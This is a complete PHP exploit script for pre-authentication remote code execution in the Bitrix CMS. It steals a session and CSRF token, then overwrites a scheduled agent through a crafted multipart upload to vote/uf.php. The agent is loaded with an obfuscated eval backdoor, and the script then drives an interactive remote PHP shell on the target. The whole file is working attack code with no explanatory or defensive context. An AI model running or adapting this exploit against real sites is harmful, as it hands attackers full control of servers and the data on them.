<?php
message('Bitrix Pre-Auth Remote Code Execution via Arbitrary Object Instantiation');
message('Affected versions: <= 21.400.100 [ Standart <= Business | CRM (any user) ]');
(!isset($argv[1]) ? exit(message('php '.basename(__FILE__).' https://target-bitrix.com')) : @list($x, $url, $id) = $argv);
message('Target: '.$url);

# get phpsess + csrf
if(!preg_match('#(PHPSESSID=.+;).+\'bitrix_sessid\':\'(.+)\'#Uis', request($url.'/bitrix/tools/composite_data.php'), $matches)) exit(message('composite_data problems')); else message($matches[1].', sessid='.$matches[2]);

# update the agent
$body = implode("\r\n", [
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files['.index($id).'][]"',
	'',
	'1',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files['.index($id).'][default]"; filename="image.jpg"',
	'Content-Type: image/jpeg',
	'',
	str_repeat(' ', 1234),
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files['.index($id).'][IS_PERIOD]"',
	'',
	'Y',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files['.index($id).'][RETRY_COUNT]"',
	'',
	'0',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files['.index($id).'][AGENT_INTERVAL]"',
	'',
	'0',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files['.index($id).'][MODULE_ID]"',
	'',
	'main',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files['.index($id).'][ACTIVE]"',
	'',
	'Y',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_files['.index($id).'][NAME]"',
	'',
	furl(agent($id)),
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_info[packageIndex]"',
	'',
	'pIndex101',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_info[mode]"',
	'',
	'upload',
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="sessid"',
	'',
	$matches[2],
	'-----------------------------xxxxxxxxxxxx',
	'Content-Disposition: form-data; name="bxu_info[filesCount]"',
	'',
	'1',
	'-----------------------------xxxxxxxxxxxx--'
]);

if(!strpos(request($url.'/bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote', $matches[1], $body, 'Content-Type: multipart/form-data; boundary=---------------------------xxxxxxxxxxxx'), '$arAgent')) exit(message('Fail. Agent update problems.'));

message('Injected PHP code: '.PHP_EOL.payload());
message('Sleeping 60 seconds for the agent activation.'); xsleep(60);
message('Now you can use the "bitrixxx" request param or use this console.');
message('Then done, type "EXIT" to restore the agent.');

do {
	$code = trim(readline('php > '));
	readline_add_history($code);
	
	if($code != 'EXIT')
		message(substr(strstr(request($url.'/', $matches[1], 'bitrixxx='.furl(furl('print "~~~";'.$code))), '~~~'), 3));
	else
		break;
		
} while(1);

# restore the agent
request($url, $matches[1], 'restorexxx=1');
message('Agent restored.');
message('Bye.');


function request($url, $cookie = '', $post = '', $header = []){
	$header = array_merge([($cookie ? 'Cookie: '.$cookie : '')], (is_string($header) ? [$header] : $header));

	$body = @file_get_contents($url, false, stream_context_create(
								['ssl' => [
									'verify_peer' => false,
									'verify_peer_name' => false,
								],
								'http' =>
								[	'timeout' => 10,
									'method' => ($post ? 'POST' : 'GET'),
									'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
									'header' => implode("\r\n", $header),
									'content' => ($post ? $post : '')
                                ]
                             ])
           );
           
	$header = implode(PHP_EOL, $http_response_header);
     
	return $header.PHP_EOL.PHP_EOL.$body;
}

function agent($id = 1){
	return '$arAgent["NAME"];'.t('eval(urldecode(strrev(\''.strrev(furl('
	'.payload().'
	return true;')).'\')));');
}

function payload(){
	return '
	if(isset($_REQUEST["bitrixxx"])){
		$DB->Query("UPDATE b_agent SET DATE_CHECK = NULL, RETRY_COUNT = 0, RUNNING = \'N\' WHERE ID = 1");
		
		try{
			$e = eval(urldecode(urldecode($_REQUEST["bitrixxx"])));
		}
		catch (Exception $e){
			exit;
		}
	}
	else{
		$r = \'\\\\Bitrix\\\\Main\\\\Analytics\\\\CounterDataTable::submitData();\';
		if(isset($_REQUEST["restorexxx"])){
			$DB->Query("UPDATE b_agent SET AGENT_INTERVAL = 60, IS_PERIOD = \'N\' WHERE ID = 1");
			$eval_result = $r;
		}
		else
			eval($r);
	}';
}

function index($id){
	return 'dd';
}

function furl($str){
	return '%'.implode('%', str_split(bin2hex($str), 2));
}

function j(){
	$l = rand(10, 50);
	while(!isset($c[$l])) @$c .= chr(rand(32, 126));
	
	if(rand(0, 1))
		return (rand(0, 1) ? "#".chr(rand(32, 90)) : "//").str_replace("?>", "", $c).(rand(0, 1) ? "\r" : "\n");
	else
		return (rand(0, 1) ? "/*".str_replace("*/","", $c)."*/" : (rand(0, 1) ? "\t".j() : " ".j()));
}

function xsleep($t){
	 $s = 0;
	 
	 do{
		print '-';
		sleep(1);
		$s++;
	} while($s < $t);
	
	print PHP_EOL;
}
function t($s){
	foreach(token_get_all('<?php '.$s) as $t)
		@$r .= (is_array($t) ? $t[1] : $t).j();
	return j().substr($r, 5);
}

function message($str){
	print PHP_EOL.'### '.$str.' ###'.PHP_EOL.PHP_EOL;
}
